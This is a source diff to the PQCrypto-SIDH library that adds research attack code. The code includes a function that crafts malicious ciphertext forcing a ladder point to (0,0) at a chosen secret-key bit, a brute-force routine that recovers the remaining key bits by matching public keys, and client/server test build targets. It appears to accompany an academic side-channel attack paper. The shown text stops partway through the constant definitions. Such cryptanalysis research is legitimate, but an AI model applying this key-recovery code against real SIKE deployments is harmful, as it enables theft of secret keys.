@@ -1,0 +1,1601 @@
+diff -ruN '--exclude=.git' PQCrypto-SIDH/Makefile PQCrypto-SIDH-modify-backup/Makefile
+--- PQCrypto-SIDH/Makefile	2022-06-05 15:34:06.264084060 -0500
++++ PQCrypto-SIDH-modify-backup/Makefile	2022-02-20 17:04:10.347463000 -0600
+@@ -272,6 +272,9 @@
+ 	$(CC) $(CFLAGS) -L./lib503 tests/test_SIKEp503.c tests/test_extras.c -lsidh $(LDFLAGS) -o sike503/test_SIKE $(ARM_SETTING)
+ 	$(CC) $(CFLAGS) -L./lib610 tests/test_SIKEp610.c tests/test_extras.c -lsidh $(LDFLAGS) -o sike610/test_SIKE $(ARM_SETTING)
+ 	$(CC) $(CFLAGS) -L./lib751 tests/test_SIKEp751.c tests/test_extras.c -lsidh $(LDFLAGS) -o sike751/test_SIKE $(ARM_SETTING)
++	$(CC) $(CFLAGS) -L./lib751 tests/test_SIKEp751_CLIENT.c tests/test_extras.c -lsidh -lpthread $(LDFLAGS) -o sike751/test_SIKE_CLIENT $(ARM_SETTING)
++	$(CC) $(CFLAGS) -L./lib751 tests/test_SIKEp751_SERVER.c tests/test_extras.c -lsidh -lpthread $(LDFLAGS) -o sike751/test_SIKE_SERVER $(ARM_SETTING)	
++	$(CC) $(CFLAGS) -L./lib751 tests/test_SIKEp751_LOCAL.c tests/test_extras.c -lsidh -lpthread $(LDFLAGS) -o sike751/test_SIKE_LOCAL $(ARM_SETTING)	
+ 	$(CC) $(CFLAGS) -L./lib434comp tests/test_SIDHp434_compressed.c tests/test_extras.c -lsidh $(LDFLAGS) -o sidh434_compressed/test_SIDH $(ARM_SETTING)
+ 	$(CC) $(CFLAGS) -L./lib503comp tests/test_SIDHp503_compressed.c tests/test_extras.c -lsidh $(LDFLAGS) -o sidh503_compressed/test_SIDH $(ARM_SETTING)
+ 	$(CC) $(CFLAGS) -L./lib610comp tests/test_SIDHp610_compressed.c tests/test_extras.c -lsidh $(LDFLAGS) -o sidh610_compressed/test_SIDH $(ARM_SETTING)
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/ec_isogeny.c PQCrypto-SIDH-modify-backup/src/ec_isogeny.c
+--- PQCrypto-SIDH/src/ec_isogeny.c	2022-06-05 15:34:06.300084300 -0500
++++ PQCrypto-SIDH-modify-backup/src/ec_isogeny.c	2022-02-23 16:36:12.837428408 -0600
+@@ -3,6 +3,652 @@
+ *
+ * Abstract: elliptic curve and isogeny functions
+ *********************************************************************************************/
++#include <inttypes.h>
++#include <math.h>
++#include <stdlib.h>
++#include <stdio.h>
++
++// Code from Yingchen
++// A bigInt C implementation copied from https://www3.cs.stonybrook.edu/~skiena/algorist/book/programs/bignum.c with a little bit of customization
++// Names of functions justify themselves
++#define	MAXDIGITS	200		/* maximum length bignum */ 
++#define PLUS		1		/* positive sign bit */
++#define MINUS		-1		/* negative sign bit */
++typedef struct {
++        char digits[MAXDIGITS];         /* represent the number */
++	int signbit;			/* 1 if positive, -1 if negative */ 
++        int lastdigit;			/* index of high-order digit */
++} bignum;
++
++
++void add_bignum(bignum *a, bignum *b, bignum *c);
++void print_bignum(bignum *n)
++{
++	int i;
++
++	if (n->signbit == MINUS) printf("- ");
++	for (i=n->lastdigit; i>=0; i--)
++		printf("%c",'0'+ n->digits[i]);
++
++	printf("\n");
++}
++
++int compare_bignum(bignum *a, bignum *b)
++{
++	int i;				/* counter */
++
++	if ((a->signbit == MINUS) && (b->signbit == PLUS)) return(PLUS);
++	if ((a->signbit == PLUS) && (b->signbit == MINUS)) return(MINUS);
++
++	if (b->lastdigit > a->lastdigit) return (PLUS * a->signbit);
++	if (a->lastdigit > b->lastdigit) return (MINUS * a->signbit);
++
++	for (i = a->lastdigit; i>=0; i--) {
++		if (a->digits[i] > b->digits[i]) return(MINUS * a->signbit);
++		if (b->digits[i] > a->digits[i]) return(PLUS * a->signbit);
++	}
++
++	return(0);
++}
++
++void zero_justify(bignum *n)
++{
++	while ((n->lastdigit > 0) && (n->digits[ n->lastdigit ] == 0))
++		n->lastdigit --;
++
++        if ((n->lastdigit == 0) && (n->digits[0] == 0))
++		n->signbit = PLUS;	/* hack to avoid -0 */
++}
++
++void int_to_bignum(int s, bignum *n)
++{
++	int i;				/* counter */
++	int t;				/* int to work with */
++
++	if (s >= 0) n->signbit = PLUS;
++	else n->signbit = MINUS;
++
++	for (i=0; i<MAXDIGITS; i++) n->digits[i] = (char) 0;
++
++	n->lastdigit = -1;
++
++	t = abs(s);
++
++	while (t > 0) {
++		n->lastdigit ++;
++		n->digits[ n->lastdigit ] = (t % 10);
++		t = t / 10;
++	}
++
++	if (s == 0) n->lastdigit = 0;
++}
++
++void initialize_bignum(bignum *n)
++{
++	int_to_bignum(0,n);
++}
++
++
++int max(int a, int b)
++{
++	if (a > b) return(a); else return(b);
++}
++
++
++void subtract_bignum(bignum *a, bignum *b, bignum *c)
++{
++	int borrow;			/* has anything been borrowed? */
++	int v;				/* placeholder digit */
++	int i;				/* counter */
++
++	initialize_bignum(c);
++
++	if ((a->signbit == MINUS) || (b->signbit == MINUS)) {
++                b->signbit = -1 * b->signbit;
++                add_bignum(a,b,c);
++                b->signbit = -1 * b->signbit;
++		return;
++        }
++
++	if (compare_bignum(a,b) == PLUS) {
++		subtract_bignum(b,a,c);
++		c->signbit = MINUS;
++		return;
++	}
++
++        c->lastdigit = max(a->lastdigit,b->lastdigit);
++        borrow = 0;
++
++        for (i=0; i<=(c->lastdigit); i++) {
++		v = (a->digits[i] - borrow - b->digits[i]);
++		if (a->digits[i] > 0)
++			borrow = 0;
++		if (v < 0) {
++			v = v + 10;
++			borrow = 1;
++		}
++
++                c->digits[i] = (char) v % 10;
++        }
++
++	zero_justify(c);
++}
++
++void add_bignum(bignum *a, bignum *b, bignum *c)
++{
++	int carry;			/* carry digit */
++	int i;				/* counter */
++
++	initialize_bignum(c);
++
++	if (a->signbit == b->signbit) c->signbit = a->signbit;
++	else {
++		if (a->signbit == MINUS) {
++			a->signbit = PLUS;
++			subtract_bignum(b,a,c);
++			a->signbit = MINUS;
++		} else {
++                        b->signbit = PLUS;
++                        subtract_bignum(a,b,c);
++                        b->signbit = MINUS;
++		}
++		return;
++	}
++
++	c->lastdigit = max(a->lastdigit,b->lastdigit)+1;
++	carry = 0;
++
++	for (i=0; i<=(c->lastdigit); i++) {
++		c->digits[i] = (char) (carry+a->digits[i]+b->digits[i]) % 10;
++		carry = (carry + a->digits[i] + b->digits[i]) / 10;
++	}
++
++	zero_justify(c);
++}
++
++
++void digit_shift(bignum *n, int d)		/* multiply n by 10^d */
++{
++	int i;				/* counter */
++
++	if ((n->lastdigit == 0) && (n->digits[0] == 0)) return;
++
++	for (i=n->lastdigit; i>=0; i--)
++		n->digits[i+d] = n->digits[i];
++
++	for (i=0; i<d; i++) n->digits[i] = 0;
++
++	n->lastdigit = n->lastdigit + d;
++}
++
++
++
++void multiply_bignum(bignum *a, bignum *b, bignum *c)
++{
++	bignum row;			/* represent shifted row */
++	bignum tmp;			/* placeholder bignum */
++	int i,j;			/* counters */
++
++	initialize_bignum(c);
++
++	row = *a;
++
++	for (i=0; i<=b->lastdigit; i++) {
++		for (j=1; j<=b->digits[i]; j++) {
++			add_bignum(c,&row,&tmp);
++			*c = tmp;
++		}
++		digit_shift(&row,1);
++	}
++
++	c->signbit = a->signbit * b->signbit;
++
++	zero_justify(c);
++}
++
++
++void divide_bignum(bignum *a, bignum *b, bignum *c)
++{
++        bignum row;                     /* represent shifted row */
++        bignum tmp;                     /* placeholder bignum */
++	int asign, bsign;		/* temporary signs */
++        int i,j;                        /* counters */
++
++	initialize_bignum(c);
++
++	c->signbit = a->signbit * b->signbit;
++
++	asign = a->signbit;
++	bsign = b->signbit;
++
++	a->signbit = PLUS;
++        b->signbit = PLUS;
++
++	initialize_bignum(&row);
++	initialize_bignum(&tmp);
++
++	c->lastdigit = a->lastdigit;
++
++	for (i=a->lastdigit; i>=0; i--) {
++		digit_shift(&row,1);
++		row.digits[0] = a->digits[i];
++		c->digits[i] = 0;
++		while (compare_bignum(&row,b) != PLUS) {
++			c->digits[i] ++;
++			subtract_bignum(&row,b,&tmp);
++			row = tmp;
++		}
++	}
++
++	zero_justify(c);
++
++	a->signbit = asign;
++	b->signbit = bsign;
++}
++
++// End of bigint class
++
++
++// Code from Yingchen
++// Doubling of a Montgomery point in affine coordinates. Given x and y, and curve coordinates
++void affineDBL(f2elm_t Px, f2elm_t Py, f2elm_t dblPx, f2elm_t dblPy, f2elm_t a, f2elm_t b){
++    f2elm_t t0, t1, t2;
++    fp2zero(t0);
++    fp2zero(t1);
++    fp2zero(t2);
++    f2elm_t one;
++    fp2zero(one);
++
++    fpcopy((digit_t*)&Montgomery_one, one[0]);
++    
++    fp2mul_mont(Px, Px, t0);        // t0 = XP*XP    
++    fp2add(t0, t0, t1);             // t1 = t0+t0    
++    fp2copy(one, t2);               // t2=one;
++    fp2add(t0, t1, t0);             // t0 = t0+t1
++    fp2mul_mont(Px, a, t1);         // t1 = a*XP
++    fp2add(t1, t1, t1);             // t1 = t1+t1
++    fp2add(t1, t0, t0);             // t0 = t0+t1
++    fp2add(t2, t0, t0);             // t0 = t0+t2
++    fp2mul_mont(b, Py ,t1);         // t1 = b*YP
++    fp2add(t1, t1, t1);             // t1 = t1+t1
++    fp2inv_mont(t1);                // t1 = 1/t1
++    fp2mul_mont(t0, t1, t0);        // t0=t0*t1
++    fp2mul_mont(t0, t0, t1);        // t1=t0*t0
++    fp2mul_mont(b, t1 ,t2);         // t2 = b*t1
++    fp2sub(t2, a, t2);              // t2 = t2-a
++    fp2sub(t2, Px, t2);             // t2 = t2-xp
++    fp2sub(t2, Px, t2);             // t2 = t2-xp
++    fp2mul_mont(t1, t0, t1);        // t1=t0*t1
++    fp2mul_mont(b, t1 ,t1);         // t1 = b*t1
++    fp2add(Py, t1, t1);             // t1 = t1+YP
++    fp2add(Px, Px, dblPy);          // y_2P = XP+XP
++    fp2add(Px, dblPy, dblPy);       // y_2P = y_2P+XP
++    fp2add(a, dblPy, dblPy);        // y_2P = y_2P+a
++    fp2mul_mont(t0, dblPy, dblPy);  // y_2P=y_2P*t0
++    fp2sub(dblPy, t1, dblPy);       // y_2P= y_2P-t1
++    fp2copy(t2, dblPx);             // x_2P = t2
++}
++
++// Code from Yingchen
++// Addition of two Montgomery points in affine coordinates
++void affineADD(f2elm_t Px, f2elm_t Py, f2elm_t Qx, f2elm_t Qy, f2elm_t P_Qx, f2elm_t P_Qy, f2elm_t a, f2elm_t b){
++    f2elm_t t0, t1, t2;
++    fp2zero(t0);
++    fp2zero(t1);
++    fp2zero(t2);
++    
++    fp2sub(Qy, Py, t0);         // t0 = yq-yp
++    fp2sub(Qx, Px, t1);         // t1 = xq-xp  
++    fp2inv_mont(t1);            // t1 = 1/t1   
++    fp2mul_mont(t1, t0, t0);    // t0 = t0*t1   
++    fp2mul_mont(t0, t0, t1);    // t1 = t0*t0    
++    fp2add(Px, Px, t2);         // t2 = xp+xp    
++    fp2add(Qx, t2, t2);         // t2 = t2+xq    
++    fp2add(a, t2, t2);          // t2 = t2+a    
++    fp2mul_mont(t2, t0, t2);    // t2 = t2*t0    
++    fp2mul_mont(t1, t0, t0);    // t0 = t0*t1    
++    fp2mul_mont(b, t0, t0);     // t0 = b*t0
++    fp2add(Py, t0, t0);         // t0 = t0+yp    
++    fp2sub(t2, t0, t0);         // t0 = t2-t0   
++    fp2mul_mont(b, t1, t1);     // t1 = b*t1
++    fp2sub(t1, a, t1);          // t1 = t1-a    
++    fp2sub(t1, Px, t1);         // t1 = t1-xp    
++    fp2sub(t1, Qx, P_Qx);       // x_PaQ = t1-xq    
++    fp2copy(t0, P_Qy);          // y_PaQ = t0
++}
++
++// Code from Yingchen
++// Convert a integer into binary representation
++int* decToBinary(int n, int* length)
++{
++    int64_t number = n;
++    
++    // Counter for binary array
++    int i = 63;
++    int* binaryNum = malloc( 64 * sizeof(int) );
++    for(int j = 0; j < 64; j++){
++        binaryNum[j] = 0;
++    }
++    while (number > 0) {
++        // Storing remainder in binary array
++        binaryNum[i] = (int)(number % 2);
++        number = number / 2;
++        i--;
++    }
++    
++    int not_0_index = 63; 
++    for(int j = 0; j < 64; j++){
++        if(binaryNum[j] != 0){
++            not_0_index = j;
++            break;
++        }
++    }
++                  
++    int* final_binary = malloc( (64-not_0_index) * sizeof(int) );
++    for(int j = 0; j < (64-not_0_index); j++){
++        final_binary[j] = binaryNum[j+not_0_index];
++    }
++    
++    (*length) = (64-not_0_index);
++    free(binaryNum);
++    
++    return final_binary;
++}
++
++
++// Code from Yingchen
++// We recovered enough secret and it is time to brute force the rest
++void brute_secret(int* secret_recovered, unsigned char* public, int bit_to_recover, int nbits){
++    int total = (int)(pow(2, (nbits-bit_to_recover)));
++
++    for(int i=0; i<total; i++){
++        printf("Brute force number %d\n", i);
++        int curr_length;
++        int* curr_binary = decToBinary(i,&curr_length);
++        for (int j = 0; j < curr_length; j++) {
++            printf("%d", curr_binary[j]);
++        }
++        printf("\ncurr_length %d\n", curr_length);
++        int* curr_key = malloc( nbits * sizeof(int) );
++        for(int j=0; j<nbits; j++){
++            curr_key[j] = 0;
++        }
++        for(int j=0; j<bit_to_recover; j++){
++            curr_key[j] = secret_recovered[j];
++        }
++        for(int j=0; j<curr_length; j++){
++            curr_key[nbits-curr_length+j] = curr_binary[j];
++        }
++        
++        printf("Secret key brute force binary\n");
++        for (int j = 0; j < nbits; j++) {
++            printf("%d", curr_key[j]);
++        }
++        printf("Secret key brute force binary end\n");
++        
++        unsigned char sk_hex[CRYPTO_SECRETKEYBYTES] = {0};
++        
++        int count_byte = 0;
++        int curr_byte = 0;
++        for(int j=0; j<nbits; j++){
++            if(j%8==0){
++                curr_byte = 0;
++            }
++            int index = j%8;
++            int value = (int)(curr_key[j]*pow(2, index));
++            curr_byte = curr_byte + value;
++            
++            if((j%8==7) || (j == (nbits-1) )){
++                sk_hex[count_byte] = curr_byte;
++                count_byte = count_byte+1;
++            }
++        }
++        
++        printf("Secret key brute force hex\n");
++        for (int j = 0; j < SECRETKEY_B_BYTES; j++) {
++            printf("%d ", sk_hex[j]);
++        }
++        printf("Secret key brute force hex end\n");
++        
++        //compute pub keys
++        unsigned char pk[CRYPTO_PUBLICKEYBYTES] = {0};
++        EphemeralKeyGeneration_B(sk_hex, pk);
++        
++        printf("Public key brute force hex\n");
++        int correct = 1;
++        for (int j = 0; j < CRYPTO_PUBLICKEYBYTES; j++) {
++            printf("%d ", pk[j]);
++            if(pk[j] != public[j]){
++                correct = 0;
++            }
++        }
++        printf("Public key brute force hex end %d\n", correct);
++        
++        free(curr_key);
++        free(curr_binary);
++        if(correct){
++            printf("FOUND!!!!\n");
++            break;
++        }
++    }
++}
++
++// Code from Yingchen
++// The curve parameter is a=6, b=1. You can change to whatever curve you like
++// The algorithm is a reverse of the LADDER3PT algorithm. The intuition behind this is described in the paper section 5.2.
++// Output: The constructed ciphertext x_R0, x_R1, x_R2, such that at the beginning of target_bit iteration, the point R2 will be (0,0)
++void prep_ct(const int*/*unsigned char**/ secret, int nbits, int target_bit, unsigned char* pk){
++    f2elm_t one, six;
++    fp2zero(one);
++    fp2zero(six);
++    fpcopy((digit_t*)&Montgomery_one, one[0]);
++    fp2add(one, one, six);          // 2 = 1+1
++    fp2add(six, six, six);          // 4 = 2+2
++    fp2add(one, six, six);          // 5 = 4+1
++    fp2add(one, six, six);          // 6 = 5+1
++    
++    f2elm_t xP2_toMont, yP2_toMont = {0};
++    to_fp2mont(xP2, xP2_toMont);
++    to_fp2mont(yP2, yP2_toMont);
++    
++    f2elm_t xP3_toMont, yP3_toMont = {0};
++    to_fp2mont(xP3, xP3_toMont);
++    to_fp2mont(yP3, yP3_toMont);
++    
++    f2elm_t xp3_p2, yp3_p2 = {0};
++    affineADD(xP2_toMont, yP2_toMont, xP3_toMont, yP3_toMont, xp3_p2, yp3_p2, six, one);
++    
++    f2elm_t xA, yA, m_yp3_p2 = {0};
++    fp2zero(xA);
++    fp2zero(yA);
++    fp2sub(xA, yp3_p2, m_yp3_p2);   // m_yp3_p2 = 0 - yp3_p2
++    
++    int bit, swap, prevbit = 0;
++    
++    bignum big_zero, big_one, r0_r0_count, r0_r1_count, r0_r2_count, r1_r0_count, r1_r1_count, r1_r2_count, r2_r0_count, r2_r1_count, r2_r2_count, target_r2_r0_count, target_r2_r1_count, target_r2_r2_count;
++    
++    int_to_bignum(0,&big_zero);
++    int_to_bignum(1,&big_one);
++   
++    int_to_bignum(1,&r0_r0_count);    
++    int_to_bignum(0,&r0_r1_count);
++    int_to_bignum(0,&r0_r2_count);    
++    int_to_bignum(0,&r1_r0_count);
++    int_to_bignum(1,&r1_r1_count);
++    int_to_bignum(0,&r1_r2_count);
++    int_to_bignum(0,&r2_r0_count);
++    int_to_bignum(0,&r2_r1_count);
++    int_to_bignum(1,&r2_r2_count);
++    int_to_bignum(0,&target_r2_r0_count);
++    int_to_bignum(0,&target_r2_r1_count);                                
++    int_to_bignum(0,&target_r2_r2_count); 
++                                           
++    for(int i = 0; i < nbits; i++){
++        bit = secret[i];
++        swap = bit ^ prevbit;
++        prevbit = bit;
++        
++        //If we don't swap, then r2 will be point A with x=0, otherwsie, r1 will be point A with x=0             
++        if(i == target_bit){
++            target_r2_r0_count = r2_r0_count;
++            target_r2_r1_count = r2_r1_count;
++            target_r2_r2_count = r2_r2_count;                     
++            break;            
++        }
++        
++        if(swap==1){ 
++            bignum temp_r0_count, temp_r1_count, temp_r2_count;	    	    
++	        temp_r0_count = r1_r0_count;
++            temp_r1_count = r1_r1_count;
++            temp_r2_count = r1_r2_count;
++            
++            r1_r0_count = r2_r0_count;
++            r1_r1_count = r2_r1_count;
++            r1_r2_count = r2_r2_count;
++            
++            r2_r0_count = temp_r0_count;
++            r2_r1_count = temp_r1_count;
++            r2_r2_count = temp_r2_count;
++            
++            bignum m_r0_r0_count, m_r0_r1_count, m_r0_r2_count, my_zero;	    
++            int_to_bignum(0,&my_zero);
++            subtract_bignum(&my_zero,&r0_r0_count,&m_r0_r0_count);
++            subtract_bignum(&my_zero,&r0_r1_count,&m_r0_r1_count);
++            subtract_bignum(&my_zero,&r0_r2_count,&m_r0_r2_count);
++            
++            r0_r0_count = m_r0_r0_count;
++            r0_r1_count = m_r0_r1_count;
++            r0_r2_count = m_r0_r2_count;
++	    }
++	
++        bignum add_r2_r0_count, add_r2_r1_count, add_r2_r2_count;
++        add_bignum(&r2_r0_count,&r0_r0_count,&add_r2_r0_count);
++        add_bignum(&r2_r1_count,&r0_r1_count,&add_r2_r1_count);
++        add_bignum(&r2_r2_count,&r0_r2_count,&add_r2_r2_count);		
++      
++        r2_r0_count = add_r2_r0_count;
++        r2_r1_count = add_r2_r1_count;
++        r2_r2_count = add_r2_r2_count;
++            
++        bignum dbl_r0_r0_count, dbl_r0_r1_count, dbl_r0_r2_count;
++        add_bignum(&r0_r0_count,&r0_r0_count,&dbl_r0_r0_count);
++        add_bignum(&r0_r1_count,&r0_r1_count,&dbl_r0_r1_count);
++        add_bignum(&r0_r2_count,&r0_r2_count,&dbl_r0_r2_count);
++      
++        r0_r0_count = dbl_r0_r0_count;
++        r0_r1_count = dbl_r0_r1_count;
++        r0_r2_count = dbl_r0_r2_count; 
++    }
++    
++    bignum p_scalar;
++    
++    if(compare_bignum(&big_zero, &target_r2_r0_count) == PLUS /*target_r2_r0_count>big_zero*/){
++        p_scalar = target_r2_r0_count;
++    }else{
++        bignum m_target_r2_r0_count, my_zero;	    
++	    int_to_bignum(0,&my_zero);
++	    subtract_bignum(&my_zero,&target_r2_r0_count,&m_target_r2_r0_count);
++        p_scalar = m_target_r2_r0_count;
++    }
++
++    f2elm_t x_pscalar, y_pscalar = {0};
++    fp2zero(x_pscalar);
++    fp2zero(y_pscalar);
++       
++    int first_time = 0;
++    
++    bignum my_number = p_scalar;
++    bignum two;
++    int_to_bignum(2,&two); 
++       
++    int p_scalar_binary_full[1000] = {0};
++    int length = 0;
++    
++    while(compare_bignum(&big_zero, &my_number) == PLUS /*my_number>0*/){
++        bignum half_my_number;
++        divide_bignum(&my_number,&two,&half_my_number);
++        bignum half_my_number_2;
++        multiply_bignum(&half_my_number,&two,&half_my_number_2);
++        bignum remainder;
++        subtract_bignum(&my_number,&half_my_number_2,&remainder);
++
++           
++        if(compare_bignum(&remainder, &big_one) == 0){  // remainder==1     
++            p_scalar_binary_full[length] = 1;
++        }else{                                          // remainder == 0
++            p_scalar_binary_full[length] = 0;        
++        }
++        length = length + 1;
++        my_number = half_my_number;
++    }
++    
++    int* p_scalar_binary = malloc( length * sizeof(int) );
++    for(int i = 0; i < length; i++){
++        p_scalar_binary[i] = p_scalar_binary_full[length-i-1];
++    }
++      
++    for(int i = 0; i < length; i++){
++        int curr_char = p_scalar_binary[i];
++        if(curr_char==1){       
++            f2elm_t x2np, y2np = {0};
++            fp2copy(xp3_p2, x2np);
++            fp2copy(yp3_p2, y2np);          
++            for(int j = 0; j < (length-i-1); j++){
++                f2elm_t x2np_double, y2np_double = {0};
++                affineDBL(x2np, y2np, x2np_double, y2np_double, six, one);
++                fp2copy(x2np_double, x2np);
++                fp2copy(y2np_double, y2np);               
++            }
++            if(first_time == 0){
++                fp2copy(x2np, x_pscalar);
++                fp2copy(y2np, y_pscalar);
++                first_time = 1;
++            }else{
++                f2elm_t xp_q, yp_q = {0};
++                affineADD(x2np, y2np, x_pscalar, y_pscalar, xp_q, yp_q, six, one);
++                fp2copy(xp_q, x_pscalar);
++                fp2copy(yp_q, y_pscalar);             
++            }
++       }
++    }
++   
++    if(compare_bignum(&big_zero, &target_r2_r0_count) == PLUS /*target_r2_r0_count>0*/){
++        f2elm_t zero_curr, m_y_pscalar = {0};
++        fp2zero(zero_curr);
++        fp2sub(zero_curr, y_pscalar, m_y_pscalar);
++        fp2copy(m_y_pscalar, y_pscalar);
++    }
++     
++    f2elm_t y_R1, y_R2 = {0};
++    f2elm_t xR1, xR2 = {0};
++
++    // xp3_p2 = R0, xR1, xR2 
++    if(compare_bignum(&big_zero, &target_r2_r1_count) == PLUS /*target_r2_r1_count>0*/){
++        affineADD(xA, yA, x_pscalar, y_pscalar, xR1, y_R1, six, one);
++        if(compare_bignum(&big_zero, &p_scalar) == 0){
++            // xR1 = xA, yR1 = yA
++            fp2copy(xA, xR1);
++            fp2copy(yA, y_R1);
++        }
++        affineADD(xR1, y_R1, xp3_p2, yp3_p2, xR2, y_R2, six, one);                 
++    }else if( compare_bignum(&big_zero, &target_r2_r2_count) == PLUS /*target_r2_r2_count>0*/){
++        affineADD(xA, yA, x_pscalar, y_pscalar, xR2, y_R2, six, one);
++        if(compare_bignum(&big_zero, &p_scalar) == 0){
++            // xR2 = xA, yR2 = yA
++            fp2copy(xA, xR2);
++            fp2copy(yA, y_R2);
++        }
++        affineADD(xR2, y_R2, xp3_p2, m_yp3_p2, xR1, y_R1, six, one); 
++    }
++   
++    fp2_encode(xR1, pk);
++    fp2_encode(xp3_p2, pk + FP2_ENCODED_BYTES);
++    fp2_encode(xR2, pk + 2*FP2_ENCODED_BYTES); 
++}
++
++
++
++
+ 
+ 
+ void xDBL(const point_proj_t P, point_proj_t Q, const f2elm_t A24plus, const f2elm_t C24)
+@@ -715,4 +1361,4 @@
+     swap_points(R, R2, mask);
+ }
+ 
+-#endif
+\ No newline at end of file
++#endif
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P434/P434.c PQCrypto-SIDH-modify-backup/src/P434/P434.c
+--- PQCrypto-SIDH/src/P434/P434.c	2022-06-05 15:34:06.264084060 -0500
++++ PQCrypto-SIDH-modify-backup/src/P434/P434.c	2022-02-23 16:44:54.913661352 -0600
+@@ -20,7 +20,12 @@
+ //
+ // Curve isogeny system "SIDHp434". Base curve: Montgomery curve By^2 = Cx^3 + Ax^2 + Cx defined over GF(p434^2), where A=6, B=1, C=1 and p434 = 2^216*3^137-1
+ //
+-         
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t xP3[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP3[2 * NWORDS64_FIELD] = { }; 
++       
+ const uint64_t p434[NWORDS64_FIELD]              = { 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFDC1767AE2FFFFFF, 
+                                                      0x7BC65C783158AEA3, 0x6CFC5FD681C52056, 0x0002341F27177344 };
+ const uint64_t p434x2[NWORDS64_FIELD]            = { 0xFFFFFFFFFFFFFFFE, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFB82ECF5C5FFFFFF,
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P434/P434_compressed.c PQCrypto-SIDH-modify-backup/src/P434/P434_compressed.c
+--- PQCrypto-SIDH/src/P434/P434_compressed.c	2022-06-05 15:34:06.264084060 -0500
++++ PQCrypto-SIDH-modify-backup/src/P434/P434_compressed.c	2022-02-23 16:44:50.977638156 -0600
+@@ -21,7 +21,12 @@
+ //
+ // Curve isogeny system "SIDHp434". Base curve: Montgomery curve By^2 = Cx^3 + Ax^2 + Cx defined over GF(p434^2), where A=6, B=1, C=1 and p434 = 2^216*3^137-1
+ //
+-         
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t xP3[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP3[2 * NWORDS64_FIELD] = { }; 
++        
+ const uint64_t p434[NWORDS64_FIELD]              = { 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFDC1767AE2FFFFFF, 
+                                                      0x7BC65C783158AEA3, 0x6CFC5FD681C52056, 0x0002341F27177344 };
+ const uint64_t p434x2[NWORDS64_FIELD]            = { 0xFFFFFFFFFFFFFFFE, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFB82ECF5C5FFFFFF,
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P503/P503.c PQCrypto-SIDH-modify-backup/src/P503/P503.c
+--- PQCrypto-SIDH/src/P503/P503.c	2022-06-05 15:34:06.268084086 -0500
++++ PQCrypto-SIDH-modify-backup/src/P503/P503.c	2022-02-23 16:44:43.673594867 -0600
+@@ -20,7 +20,13 @@
+ //
+ // Curve isogeny system "SIDHp503". Base curve: Montgomery curve By^2 = Cx^3 + Ax^2 + Cx defined over GF(p503^2), where A=6, B=1, C=1 and p503 = 2^250*3^159-1
+ //
+-         
++
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t xP3[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP3[2 * NWORDS64_FIELD] = { };
++      
+ const uint64_t p503[NWORDS64_FIELD]              = { 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xABFFFFFFFFFFFFFF, 
+                                                      0x13085BDA2211E7A0, 0x1B9BF6C87B7E7DAF, 0x6045C6BDDA77A4D0, 0x004066F541811E1E };
+ const uint64_t p503x2[NWORDS64_FIELD]            = { 0xFFFFFFFFFFFFFFFE, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0x57FFFFFFFFFFFFFF,
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P503/P503_compressed.c PQCrypto-SIDH-modify-backup/src/P503/P503_compressed.c
+--- PQCrypto-SIDH/src/P503/P503_compressed.c	2022-06-05 15:34:06.272084113 -0500
++++ PQCrypto-SIDH-modify-backup/src/P503/P503_compressed.c	2022-02-23 16:44:40.573576396 -0600
+@@ -21,7 +21,12 @@
+ //
+ // Curve isogeny system "SIDHp503". Base curve: Montgomery curve By^2 = Cx^3 + Ax^2 + Cx defined over GF(p503^2), where A=6, B=1, C=1 and p503 = 2^250*3^159-1
+ //
+-         
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t xP3[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP3[2 * NWORDS64_FIELD] = { }; 
++        
+ const uint64_t p503[NWORDS64_FIELD]              = { 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xABFFFFFFFFFFFFFF, 
+                                                      0x13085BDA2211E7A0, 0x1B9BF6C87B7E7DAF, 0x6045C6BDDA77A4D0, 0x004066F541811E1E };
+ const uint64_t p503x2[NWORDS64_FIELD]            = { 0xFFFFFFFFFFFFFFFE, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0x57FFFFFFFFFFFFFF,
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P610/P610.c PQCrypto-SIDH-modify-backup/src/P610/P610.c
+--- PQCrypto-SIDH/src/P610/P610.c	2022-06-05 15:34:06.276084139 -0500
++++ PQCrypto-SIDH-modify-backup/src/P610/P610.c	2022-02-23 16:44:34.913542525 -0600
+@@ -20,6 +20,12 @@
+ //
+ // Curve isogeny system "SIDHp610". Base curve: Montgomery curve By^2 = Cx^3 + Ax^2 + Cx defined over GF(p610^2), where A=6, B=1, C=1 and p610 = 2^305*3^192-1
+ //
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP2[2 * NWORDS64_FIELD] = { }; 
